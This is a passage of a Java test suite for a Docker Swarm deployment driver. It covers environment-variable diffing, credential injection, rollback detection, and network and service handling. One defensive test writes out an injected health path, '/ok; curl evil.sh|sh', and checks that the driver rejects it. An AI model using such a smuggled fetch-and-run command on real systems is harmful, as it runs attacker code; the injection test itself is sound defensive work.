        result(0, "QITS_EVENTS_URL=http://dev-qits-events:8080\nQITS_GONE_FROM_CONFIG=stale\n"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertTrue(argv.containsAll(List.of("--env-rm", "QITS_GONE_FROM_CONFIG")), argv.toString());
    assertTrue(
        argv.containsAll(List.of("--env-add", "QITS_EVENTS_URL=http://dev-qits-events:8080")),
        argv.toString());
    assertFalse(
        argv.contains("QITS_EVENTS_URL"),
        "a key config still states is re-added, never removed: " + argv);
  }

  @Test
  void anUpdateNeverRemovesThisComponentsOwnVariablesOrAProvisionedTriple() {
    // The protected family, and it is a family rather than a list of exceptions: this component
    // writes its own four on every argv and config states none of them, so a diff against config
    // alone would remove and re-add all four on every deployment. QITS_RESOURCE_* is the fifth
    // member and is a PREFIX — ResourceProvisioning injects it from the registry row, and config
    // must not be able to delete a credential it cannot state.
    //
    // QITS_DOMAIN is in the family for the same reason and is asserted here with the driver stating
    // NO domain, deliberately: membership protects a key from removal, it does not assert that the
    // key is present. Were it outside the set, a live service carrying the domain would have it
    // env-rm'd on its next deployment by any platform that had since stopped stating one.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        SwarmDeploymentDriver.SPEC_ENV_FORMAT,
        result(
            0,
            "QITS_ENVIRONMENT=dev\n"
                + "QITS_APPLICATION=qits-gateway\n"
                + "QITS_DOMAIN=wohlben.eu\n"
                + "OTEL_RESOURCE_ATTRIBUTES=service.version=old\n"
                + "QUARKUS_OTEL_RESOURCE_ATTRIBUTES=service.version=old\n"
                + "QITS_RESOURCE_DB_URL=jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway\n"
                + "QITS_RESOURCE_DB_PASSWORD=0123456789abcdef\n"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertFalse(argv.contains("--env-rm"), "nothing in the protected family is removed: " + argv);
  }

  @Test
  void theDeployersOwnSelfUpdateKeepsTheKeysThatPointItAtQitsConfiguration() {
    // THE SCARIEST REGRESSION THIS DIFF COULD MAKE. The deployer's own extras carry the flip — the
    // extras url and the named oidc client that reads it — so a self-update that env-rm'd them
    // would come back reading the file it was demoted from, silently, with a green deployment.
    // They survive because they ARE extras: the diff removes what config no longer states, and
    // config states these.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX
                    + "qits-gateway.env.QITS_PLATFORM_DEPLOYMENTS_EXTRAS_URL",
                "http://dev-qits-configuration:8080",
                DeploymentDriver.EXTRAS_PREFIX
                    + "qits-gateway.env.QUARKUS_OIDC_CLIENT_CONFIGURATION_CLIENT_ENABLED",
                "true"));
    cli.script(
        SwarmDeploymentDriver.SPEC_ENV_FORMAT,
        result(
            0,
            "QITS_PLATFORM_DEPLOYMENTS_EXTRAS_URL=http://dev-qits-configuration:8080\n"
                + "QUARKUS_OIDC_CLIENT_CONFIGURATION_CLIENT_ENABLED=true\n"
                + "QITS_SOMETHING_NOBODY_STATES=stale\n"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertFalse(
        argv.contains("QITS_PLATFORM_DEPLOYMENTS_EXTRAS_URL"),
        "the deployer must never env-rm its own extras-url mid-self-deploy: " + argv);
    assertFalse(
        argv.contains("QUARKUS_OIDC_CLIENT_CONFIGURATION_CLIENT_ENABLED"),
        "nor the credential that read presents: " + argv);
    assertTrue(
        argv.containsAll(List.of("--env-rm", "QITS_SOMETHING_NOBODY_STATES")),
        "and the diff still works around them: " + argv);
  }

  @Test
  void aCreateRemovesNothingBecauseThereIsNoPredecessorToDiffAgainst() {
    SwarmDeploymentDriver driver = driver();
    cli.script(SwarmDeploymentDriver.SPEC_ENV_FORMAT, result(0, "QITS_GONE_FROM_CONFIG=stale\n"));

    List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertFalse(argv.contains("--env-rm"), argv.toString());
    assertEquals(0, cli.count(SwarmDeploymentDriver.SPEC_ENV_FORMAT), "and nothing was asked");
  }

  @Test
  void anEnvironmentThisDeploymentCouldNotReadRemovesNothing() {
    // A deployment must not lose an application's environment because one inspect failed. The next
    // deployment asks again; a removal taken on no evidence would be a container that boots, passes
    // its gate and has lost the address it dials.
    SwarmDeploymentDriver driver = driver();
    cli.script(SwarmDeploymentDriver.SPEC_ENV_FORMAT, result(1, "no such service"));

    assertFalse(driver.buildUpdateArgv(spec(), "dev-qits-gateway").contains("--env-rm"));
  }

  @Test
  void aProvisionedResourceArrivesAsTheGenericTriple() {
    List<String> argv =
        driver()
            .buildCreateArgv(
                spec(
                    DeploymentDriver.UpdateOrder.START_FIRST,
                    List.of(
                        DeploymentDriver.ResourceBinding.postgres(
                            "read-replica",
                            "jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway",
                            "qits_gateway",
                            "0123456789abcdef"))),
                "dev-qits-gateway",
                List.of("qits-net"));

    assertTrue(
        argv.contains(
            "QITS_RESOURCE_READ_REPLICA_URL=jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway"),
        argv.toString());
    assertTrue(argv.contains("QITS_RESOURCE_READ_REPLICA_USERNAME=qits_gateway"));
    assertTrue(argv.contains("QITS_RESOURCE_READ_REPLICA_PASSWORD=0123456789abcdef"));
  }

  @Test
  void anIdpClientResourceArrivesAsItsOwnThreeVariables() {
    // The second resource type's shape: URL / CLIENT_ID / CLIENT_SECRET rather than postgres'
    // URL / USERNAME / PASSWORD — the same loop, a different ordered list of suffixes.
    List<String> argv =
        driver()
            .buildCreateArgv(
                spec(
                    DeploymentDriver.UpdateOrder.START_FIRST,
                    List.of(
                        DeploymentDriver.ResourceBinding.idp(
                            "idp",
                            "http://qits-platform-idp:8080/idp",
                            "dev-qits-gateway",
                            "an-idp-issued-secret"))),
                "dev-qits-gateway",
                List.of("qits-net"));

    assertTrue(argv.contains("QITS_RESOURCE_IDP_URL=http://qits-platform-idp:8080/idp"), argv.toString());
    assertTrue(argv.contains("QITS_RESOURCE_IDP_CLIENT_ID=dev-qits-gateway"), argv.toString());
    assertTrue(argv.contains("QITS_RESOURCE_IDP_CLIENT_SECRET=an-idp-issued-secret"), argv.toString());
    assertFalse(argv.contains("QITS_RESOURCE_IDP_USERNAME=dev-qits-gateway"), "not the postgres shape");
  }

  @Test
  void anUpdateNeverRemovesAProvisionedIdpClientTriple() {
    // QITS_RESOURCE_* is a prefix, not a list of three names — the idp shape is covered by the
    // exact guard the postgres triple is, and this pins it under its own keys rather than trusting
    // that the prefix test above generalises.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        SwarmDeploymentDriver.SPEC_ENV_FORMAT,
        result(
            0,
            "QITS_ENVIRONMENT=dev\n"
                + "QITS_APPLICATION=qits-gateway\n"
                + "QITS_RESOURCE_IDP_URL=http://qits-platform-idp:8080/idp\n"
                + "QITS_RESOURCE_IDP_CLIENT_ID=dev-qits-gateway\n"
                + "QITS_RESOURCE_IDP_CLIENT_SECRET=an-idp-issued-secret\n"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertFalse(argv.contains("--env-rm"), "the idp triple is never removed: " + argv);
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // The belt at the argv, and the reason is that this is the one value interpolated
    // into a string a shell inside the container runs.
    DeploymentDriver.ServiceSpec hostile =
        new DeploymentDriver.ServiceSpec(
            "env-id",
            "dev",
            "app-id",
            "qits-gateway",
            "dep-id",
            "abc1234",
            VERSION,
            true,
            "qits-pd-dev-qits-gateway-dep",
            "dev-qits-gateway",
            List.of("qits-net"),
            IMAGE,
            "/ok; curl evil.sh|sh",
            null,
            true,
            DeploymentDriver.UpdateOrder.START_FIRST,
            DeploymentDriver.PublishMode.HOST,
            List.of(),
            List.of());

    SwarmDeploymentDriver driver = driver();
    assertThrows(
        BadRequestException.class,
        () -> driver.buildCreateArgv(hostile, "dev-qits-gateway", List.of("qits-net")));
  }

  @Test
  void aCompletedUpdateIsAConvergedDeployment() {
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "updating|" + stamp(ISSUED) + "|update in progress"),
        result(0, "completed|" + stamp(ISSUED) + "|"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
    // Nothing for the caller to reap: a replace is in place, so the predecessor IS this service.
    assertEquals(List.of(), converged.retired());
  }

  @Test
  void aRollbackIsAFailedDeploymentWithSwarmsOwnMessageOnIt() {
    // The measured failure path: under start-first the predecessor kept serving for the whole
    // window while the unhealthy successor sat in Starting, and swarm reverted the spec by itself.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "rollback_completed|" + stamp(ISSUED) + "|rollback completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.ROLLED_BACK, converged.outcome());
    assertTrue(converged.detail().contains("rollback completed"), converged.detail());
    assertFalse(converged.converged());
  }

  @Test
  void aRollbackCarriesTheTasksAndTheLogTailBecauseTheRowIsAllAnybodyGets() {
    // The 2026-09-14 dev-qits-projects rollback could not be diagnosed at all: swarm had already
    // reverted the spec, the failed task was gone with its logs, and the row said only that
    // something had failed. The arm captures the same two things the timeout arm always did.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "rollback_completed|" + stamp(ISSUED) + "|update rolled back due to failure"));
    cli.script("service ps", result(0, "dev-qits-gateway.1  Failed 2 seconds ago  task: non-zero"));
    cli.script("service logs", result(0, "Failed to fetch JWKS from the idp\n"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.ROLLED_BACK, converged.outcome());
    assertTrue(
        converged.detail().contains("update rolled back due to failure"), converged.detail());
    assertTrue(converged.detail().contains("Failed 2 seconds ago"), converged.detail());
    assertTrue(
        converged.detail().contains("Failed to fetch JWKS from the idp"), converged.detail());
    // Bounded by the tail the log capture asks for, not by a cap this arm invented.
    assertTrue(
        cli.matching("service logs").containsAll(List.of("--tail", "200")), cli.calls.toString());
  }

  @Test
  void aPausedUpdateIsAFailureRatherThanSomethingToKeepWaitingOn() {
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "paused|" + stamp(ISSUED) + "|update paused due to failure"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("update paused"), converged.detail());
  }

  @Test
  void thePreviousUpdatesVerdictIsNotThisDeploymentsVerdict() {
    // The live defect, in one test. qits-docs had a `completed` from an earlier cutover, and
    // `service update --detach` returns before the daemon has replaced the field — so the first
    // poll answered "completed" 43ms after the update was issued and the deployer wrote the row
    // ACTIVE while swarm was still rolling the successor back. StartedAt is what tells the two
    // updates apart.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|update completed"),
        result(0, "rollback_completed|" + stamp(ISSUED.plusMillis(120)) + "|rollback completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.ROLLED_BACK, converged.outcome());
    assertTrue(converged.detail().contains("rollback completed"), converged.detail());
  }

  @Test
  void aVerdictStampedAfterTheUpdateWasIssuedIsThisDeploymentsOwn() {
    // The other half: waiting through a stale status must still end in the real answer, or the fix
    // would have turned every second deployment into a timeout.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|update completed"),
        result(0, "completed|" + stamp(ISSUED.plusMillis(120)) + "|update completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
  }

  @Test
  void anUpdateWhoseStatusNeverArrivesFailsAtTheDeadlineRatherThanReadingTheTasks() {
    // Swarm clears UpdateStatus while it takes the update in, and the task check is no answer
    // there: under start-first the PREDECESSOR is still Running, so falling through to it would
    // declare the deployment being replaced a success. The deadline is what ends this.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script("service ps", result(0, "Running 4 minutes ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO);

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("not started yet"), converged.detail());
  }

  @Test
  void theSkewToleranceIsFiveSecondsAndItIsAnEdgeRatherThanAFeeling() {
    // The daemon stamps StartedAt after the CLI returned, so only a clock disagreement can make
    // this deployment's own status look earlier than its issue instant. Five seconds is above any
    // such skew and far below the distance to the previous cutover.
    SwarmDeploymentDriver inside = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(5)) + "|done"));

    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        inside.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome());

    SwarmDeploymentDriver outside = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(6)) + "|done"));

    DeploymentDriver.Convergence stale =
        outside.awaitConverged("dev-qits-gateway", Duration.ZERO);
    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, stale.outcome());
    assertTrue(stale.detail().contains("earlier update"), stale.detail());
  }

  @Test
  void aStampThisCannotReadIsPendingRatherThanAVerdictOrACrash() {
    // Docker's wording is not an API. An unreadable stamp cannot be matched, so it cannot be
    // believed — and the raw text goes into the timeout, which is what makes the next one findable.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "completed|<nil>|update completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO);

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("<nil>"), converged.detail());
  }

  @Test
  void bothOfDockersTimestampSpellingsAreReadAndNothingElseIs() {
    // Measured on docker 29.7.2: `service inspect --format` prints Go's own time.Time.String(),
    // while the JSON body of the same inspect says RFC3339. Both are docker's, so both parse.
    Instant expected = Instant.parse("2026-08-13T10:21:12.655795838Z");
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13 10:21:12.655795838 +0000 UTC"));
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13T10:21:12.655795838Z"));
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13 12:21:12.655795838 +0200 CEST"));
    assertNull(SwarmDeploymentDriver.parseStartedAt("<nil>"));
    assertNull(SwarmDeploymentDriver.parseStartedAt("<no value>"));
    assertNull(SwarmDeploymentDriver.parseStartedAt(""));
    assertNull(SwarmDeploymentDriver.parseStartedAt(null));
  }

  @Test
  void theInFlightUpdateDoesNotOutliveItsVerdict() {
    // The issue instant is state carried between two calls on one bean, so it has to be consumed
    // by the answer: a deployment that kept it would make the NEXT question about this service
    // wait for an update nobody issued.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "completed|" + stamp(ISSUED) + "|update completed"));

    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome());

    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|done"));
    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome(),
        "nothing is in flight now, so the field is read the way the sweep reads it");
  }

  @Test
  void aFreshlyCreatedServiceHasNoUpdateStatusAndIsJudgedByItsTask() {
    // The first deployment of an application is a `service create`, and swarm records an update
    // status only from the first update onward. A task is Running only once its healthcheck passed,
    // which is the same statement the missing field would have made — and, unlike an update, there
    // is no predecessor whose task could answer instead.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(1, "no such service"));
    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, driver.apply(spec()).outcome());
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script(
        "service ps",
        result(0, "Starting less than a second ago"),
        result(0, "Running 2 seconds ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
  }

  @Test
  void aFirstDeploymentWhoseTaskDiesIsAFailedDeployment() {
    SwarmDeploymentDriver driver = driver();
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script("service ps", result(0, "Failed 1 second ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(2));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("no task"), converged.detail());
  }

  @Test
  void aServiceSwarmDoesNotHaveEndsTheWaitAtOnce() {
    SwarmDeploymentDriver driver = driver();
    cli.script(".UpdateStatus", result(1, "Error: no such service: dev-qits-gateway"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("no service"), converged.detail());
  }

  @Test
  void observationSpeaksTheGatesVocabulary() {
    // The observer settles rows on HealthGate.healthy, so a swarm task state has to arrive in the
    // same spelling a docker inspect does. Starting is PENDING, exactly as restarting is.
    SwarmDeploymentDriver driver = driver();
    cli.script("service ps", result(0, "Running 4 minutes ago"));
    assertTrue(HealthGate.healthy(driver.observe("dev-qits-gateway")));

    driver = driver();
    cli.script("service ps", result(0, "Starting less than a second ago"));
    assertEquals("starting/unhealthy", driver.observe("dev-qits-gateway").state());

    driver = driver();
    cli.script("service ps", result(0, "Shutdown 3 minutes ago"));
    assertEquals("exited/unhealthy", driver.observe("dev-qits-gateway").state());

    driver = driver();
    cli.script("service ps", result(1, "Error: no such service: dev-qits-gateway"));
    assertEquals(
        "Error: no such service: dev-qits-gateway",
        driver.observe("dev-qits-gateway").gone(),
        "a service swarm does not have is gone, which is a structural fact");
  }

  @Test
  void observationFallsBackToTheStackNamedService() {
    // The deployer's self-update keeps its seed-stack service, and the observer must read it
    // there: asking only the bare alias flipped a healthy self-updated deployer to FAILED on two
    // "no such service" passes.
    SwarmDeploymentDriver driver = driver();
    cli.script("service ps dev-qits-gateway", result(1, "Error: no such service: dev-qits-gateway"));
    cli.script("service ps qits_dev-qits-gateway", result(0, "Running 4 minutes ago"));

    assertTrue(HealthGate.healthy(driver.observe("dev-qits-gateway")));
  }

  @Test
  void anOverlayIsAttachableSoPlainContainersKeepWorkingOnIt() {
    List<String> argv =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-net", null, DeploymentDriver.NetworkKind.BUNDLE, null));

    assertEquals(
        List.of("docker", "network", "create", "-d", "overlay", "--attachable"),
        argv.subList(0, 6));
    assertTrue(argv.contains("qits.platform.deployments.network=bundle"));
    assertEquals("qits-net", argv.get(argv.size() - 1));
  }

  @Test
  void onlyTheCollapsedNetworksAreEverMade() {
    // The caller asks for a per-application network on every deployment, because it is the same
    // state machine. Making one would be an overlay no service is ever on.
    SwarmDeploymentDriver driver = driver();

    assertFalse(
        driver.ensureNetwork(
            new DeploymentDriver.Network(
                "qits-env-dev-qits-gateway",
                "env-id",
                DeploymentDriver.NetworkKind.APPLICATION,
                "qits-gateway")));
    assertTrue(cli.calls.isEmpty(), "not even a lookup: " + cli.calls);
  }

  @Test
  void aNetworkIsRemovableASecondAfterItsServicesGoSoTheRemovalRetries() {
    // Measured: the tasks' endpoints outlive the `service rm` that ordered them away, so a single
    // attempt reports a failure that is only early.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        "network rm",
        result(1, "Error response from daemon: network qits-env-dev has active endpoints"),
        result(1, "Error response from daemon: network qits-env-dev has active endpoints"),
        result(0, "qits-env-dev"));

    driver.removeNetwork("qits-env-dev");

    assertEquals(3, cli.count("network rm"), "it kept trying: " + cli.calls);
  }

  @Test
  void aNetworkNobodyHasIsNotRetriedAtAll() {
    SwarmDeploymentDriver driver = driver();
    cli.script("network rm", result(1, "Error: No such network: qits-env-gone"));

    driver.removeNetwork("qits-env-gone");

    assertEquals(1, cli.count("network rm"));
  }

  @Test
  void anEnvironmentTeardownRemovesItsServicesByLabel() {
    SwarmDeploymentDriver driver = driver();
    cli.script("service ls", result(0, "svc-a\nsvc-b\n"));

    assertEquals(2, driver.removeEnvironmentContainers("env-id"));

    List<String> listed = cli.matching("service ls");
    assertTrue(
        listed.contains("label=qits.platform.deployments.environment=env-id"), listed.toString());
    assertEquals(
        List.of("docker", "service", "rm", "svc-a", "svc-b"), cli.matching("service rm"));
  }

  @Test
  void retiringATierServiceIsOneServiceRmAndTouchesNoVolume() {
    // The plane conversion's runtime half: the application serves from the bare alias now, and the
    // <env>-<app> service the old rows named is removed. One argv, and the whole of it — there is
    // no volume flag on `service rm` to leave off, because the service object is all swarm removes.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));

    driver.removeService("dev-qits-gateway");

    assertEquals(
        List.of("docker", "service", "rm", "dev-qits-gateway"), cli.matching("service rm"));
  }

  @Test
  void retiringAnAbsentServiceIsALogLineNotAFailure() {
    // Idempotent by the same inspect every other read here uses. It has to be: a conversion may be
    // re-driven, and a row written by the docker-era code names a container rather than a service —
    // which no orchestrator holds and which must not turn a healthy deployment into a diagnosis.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gone", result(1, "no such service"));

    driver.removeService("dev-qits-gone");

    assertEquals(0, cli.count("service rm"), "nothing was removed: " + cli.calls);
  }

  @Test
  void aServiceRmTheDaemonRefusesIsAWarningNotAThrow() {
    // The deployment this runs behind is live, converged and about to be announced. An orphaned old
    // service is an operator's one-line cleanup; an exception would be a healthy deployment
    // recorded as broken.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-stuck", result(0, "svc123"));
    cli.script("service rm", result(1, "rpc error: code = Unavailable"));

    driver.removeService("dev-qits-stuck");

    assertEquals(1, cli.count("service rm"), "it was attempted exactly once: " + cli.calls);
  }

  @Test
  void aSelfUpdateIsHandedToTheManagerRatherThanAwaited() {
    // Swarm arbitrates a succession no process can arbitrate for itself: the manager lives in the
    // daemon, so it can stop this task, start the successor and revert the spec if the successor
    // never goes healthy. Nothing here waits for that — this process is what is being replaced.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("this-task-container");
    cli.script("--format {{.ID}}", result(0, "svc123"));
    // Swarm labels every task container with the service it belongs to; this task's says the
    // service being deployed is the one this process runs as.
    cli.script("Config.Labels", result(0, "dev-qits-gateway"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    assertFalse(cli.matching("service update").isEmpty(), "the update was still issued");
  }

  @Test
  void aSelfStillRunningAsTheSeedStackServiceUpdatesThatServiceInPlace() {
    // The bootstrap starts the deployer as the seed stack's service, so its own label is the
    // stack-prefixed name. The self-update must target THAT service — a bare-named sibling would
    // be a second deployer on the same registry — and the seed twin is never reaped: it is self.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("this-task-container");
    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("Config.Labels", result(0, "qits_dev-qits-gateway"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    List<String> update = cli.matching("service update");
    assertEquals(
        "qits_dev-qits-gateway", update.get(update.size() - 1), "the stack-named service is the target");
    assertTrue(cli.matching("service rm").isEmpty(), "its own seed service is not reaped");
  }

  @Test
  void aRenamedServiceIsACreateBesideTheOneThisProcessRunsAs() {
    // This test was `aFlipToThePlatformPlaneIsACreateBesideTheEnvNamedService`, and it drove the
    // case with a PLATFORM spec: the deployer re-planing itself asked for the bare alias while the
    // process ran as the env-named service. The plane is deleted, so there is no re-planing left to
    // stage — but the SITUATION it exercised is exactly the one the plane's deletion creates, with
    // the two names the other way round.
    //
    // A swarm service's NAME is its address and swarm cannot rename one, so the nine services that
    // were the plane are renamed by being created anew: `qits-ci` becomes `dev-qits-ci`, a second
    // service, while the first is still serving. (That is why the qualified name was granted as an
    // extra network alias one release earlier — nothing is left dialling a name nothing answers to
    // while the two coexist.) Here this process runs as the old bare-named service and the spec
    // asks for the qualified one: two different services, so this is NOT a self-update, nothing is
    // handed off, the successor is created beside the predecessor, and `reap` removes nothing —
    // a replace is normally in place, and this is not a replace. Removing the predecessor is a hand
    // step; README's "Self-update takes an orchestrator" spells it out.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("this-task-container");
    cli.script("Config.Labels", result(0, "qits-gateway"));
    cli.script("--format {{.ID}} dev-qits-gateway", result(1, "no such service"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));

    DeploymentDriver.ApplyResult applied =
        driver.apply(spec(DeploymentDriver.UpdateOrder.STOP_FIRST, List.of()));

    assertEquals(
        DeploymentDriver.ApplyOutcome.APPLIED,
        applied.outcome(),
        "the bare-named predecessor is not this spec's service, so nothing is handed off");
    List<String> create = cli.matching("service create");
    assertTrue(create.containsAll(List.of("--name", "dev-qits-gateway")), create.toString());
    assertTrue(
        cli.matching("service rm").isEmpty(), "nothing removes the bare-named predecessor for us");
  }

  @Test
  void theSeedTwinIsRemovedBeforeTheSuccessorTakesItsAliasAndPorts() {
    // First pipeline deploy of an application the seed stack still serves: the twin holds the
    // wire alias (DNS would round-robin between the two) and any host-mode ports (the successor
    // would sit Pending on them forever), so it goes first.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(1, "no such service"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(0, "twin123"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertEquals(
        List.of("docker", "service", "rm", "qits_dev-qits-gateway"), cli.matching("service rm"));
    assertFalse(cli.matching("service create").isEmpty(), "the successor is still created");
    int rmAt = cli.calls.indexOf(List.of("docker", "service", "rm", "qits_dev-qits-gateway"));
    int createAt =
        cli.calls.indexOf(cli.matching("service create"));
    assertTrue(rmAt < createAt, "the twin goes before the successor is created");
  }

  @Test
  void theRunningImageIsReadWithSwarmsUpdateStatusBesideIt() {
    // The startup sweep's evidence, in one inspect: what the service runs, and swarm's account of
    // the update that put it there. The image is the verdict — UpdateStatus holds the most recent
    // update alone, so a later deployment overwrites what it said about this row.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        "Spec.TaskTemplate.ContainerSpec.Image",
        result(0, IMAGE + "|rollback_completed|" + stamp(ISSUED) + "|rollback completed\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertEquals("rollback_completed: rollback completed", running.detail());
    List<String> argv = cli.matching("service inspect");
    assertEquals(
        List.of(
            "docker",
            "service",
            "inspect",
            "--format",
            SwarmDeploymentDriver.RUNNING_IMAGE_FORMAT,
            "dev-qits-gateway"),
        argv);
  }

  @Test
  void theRunningImageFallsBackToTheStackNamedService() {
    // The deployer's own self-update targets the stack-named service it runs as, so the
    // successor's startup sweep reads its evidence there too — asking only the bare alias
    // settled a succeeded self-update as "interrupted".
    SwarmDeploymentDriver driver = driver();
    cli.script("{{end}} dev-qits-gateway", result(1, "Error: no such service: dev-qits-gateway"));
    cli.script(
        "{{end}} qits_dev-qits-gateway",
        result(0, IMAGE + "|completed|" + stamp(ISSUED) + "|update completed\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertEquals("completed: update completed", running.detail());
  }

  @Test
  void aServiceSwarmDoesNotHaveIsNoEvidenceAtAll() {
    // "No such service" is not a rollback and not a success; the sweep fails the row as interrupted
    // rather than reading a verdict out of an error message.
    SwarmDeploymentDriver driver = driver();
    cli.script("service inspect", result(1, "Error: no such service: dev-qits-gone"));

    assertTrue(driver.runningImage("dev-qits-gone").isEmpty());
  }

  @Test
  void aServiceNothingHasUpdatedYetCarriesItsImageAndNoWords() {
    SwarmDeploymentDriver driver = driver();
    cli.script("Spec.TaskTemplate.ContainerSpec.Image", result(0, IMAGE + "|||\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertNull(running.detail(), "a service created and never updated has no UpdateStatus");
  }

  @Test
  void aRefusedUpdateIsARefusedDeploymentWithSwarmsWords() {
    SwarmDeploymentDriver driver = driver();
